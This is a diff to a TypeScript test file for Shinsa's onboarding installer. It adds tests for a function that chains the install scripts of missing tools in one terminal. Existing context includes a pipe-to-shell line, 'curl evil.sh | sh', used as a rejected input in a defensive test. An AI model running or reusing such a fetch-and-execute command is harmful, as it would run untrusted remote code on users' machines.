@@ -3,10 +3,12 @@ import type { TerminalInfo } from '@shinsa/core';
 import {
   type InstallTerminals,
   isReplyCommand,
+  openInstallAllTerminal,
   openInstallTerminal,
   openReplyTerminal,
   SETUP_TERMINAL_PROJECT,
 } from '../../src/onboarding/install.ts';
+import type { Prerequisite } from '../../src/onboarding/prerequisites.ts';
 
 function createTerminals(existing: TerminalInfo[] = []) {
   const calls: string[] = [];
@@ -94,6 +96,28 @@ describe('openInstallTerminal', () => {
     const { fake, calls } = createTerminals();
     expect(() => openInstallTerminal(fake, 'curl evil.sh | sh', '/Users/me')).toThrow(
       'Shinsa has no command that fixes that check.'
+    );
+    expect(calls).toEqual([]);
+  });
+});
+
+describe('openInstallAllTerminal', () => {
+  const missing = (id: string) => ({ id, ok: false }) as Prerequisite;
+
+  test('runs every missing tool’s script in one terminal, each only after the one before it worked', () => {
+    const { fake, calls } = createTerminals();
+    const terminal = openInstallAllTerminal(fake, [missing('gh'), missing('bun')], '/Users/me', {
+      resolve: (id) => `install ${id}`,
+      resolveReply: (command) => command,
+    });
+    expect(terminal).toMatchObject({ name: 'Set up the missing tools' });
+    expect(calls.at(-1)).toBe('run t1 { install gh; } && { install bun; }; exit');
+  });
+
+  test('refuses when nothing is missing', () => {
+    const { fake, calls } = createTerminals();
+    expect(() => openInstallAllTerminal(fake, [{ id: 'gh', ok: true } as Prerequisite], '/Users/me')).toThrow(
+      'Every tool Shinsa needs is installed.'
     );
     expect(calls).toEqual([]);
   });
